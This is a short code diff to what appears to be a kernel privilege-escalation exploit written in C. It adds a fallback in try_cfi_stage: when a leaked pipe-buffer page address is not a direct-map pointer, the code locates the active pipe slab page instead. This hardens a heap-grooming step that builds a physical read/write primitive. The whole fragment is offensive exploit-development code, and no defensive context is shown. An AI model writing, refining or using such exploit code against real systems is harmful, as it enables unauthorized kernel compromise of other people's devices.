@@ -511,6 +511,12 @@ int try_cfi_stage(void) {
             "attempt=%d/%d\n",
             pipebuf_page_base, first_leak_attempt + 1,
             PIPE_FIRST_LEAK_ATTEMPTS);
+    if (!is_direct_ptr(pipebuf_page_base)) {
+      pipebuf_page_base = find_active_pipe_slab_page(fd);
+      pr_info("fresh physrw pipe active slab page=%016zx attempt=%d/%d\n",
+              pipebuf_page_base, first_leak_attempt + 1,
+              PIPE_FIRST_LEAK_ATTEMPTS);
+    }
     int pipe_gate_ok = 0;
     if (is_direct_ptr(pipebuf_page_base)) {
       pipe_gate_ok = pipe_reclaim_cache_gate(fd);
@@ -537,6 +543,9 @@ int try_cfi_stage(void) {
       reset_pipe_attempt();
 #if defined(APP_FOPS_BEFORE_PIPE) && APP_FOPS_BEFORE_PIPE
       pipebuf_page_base = prepare_pipe_buffer_page();
+      if (!is_direct_ptr(pipebuf_page_base)) {
+        pipebuf_page_base = find_active_pipe_slab_page(fd);
+      }
       pr_info("fresh physrw retry page attempt=%d/%d base=%016zx\n",
               attempt + 1, PIPE_MAX_ATTEMPTS, pipebuf_page_base);
       if (!is_direct_ptr(pipebuf_page_base)) {
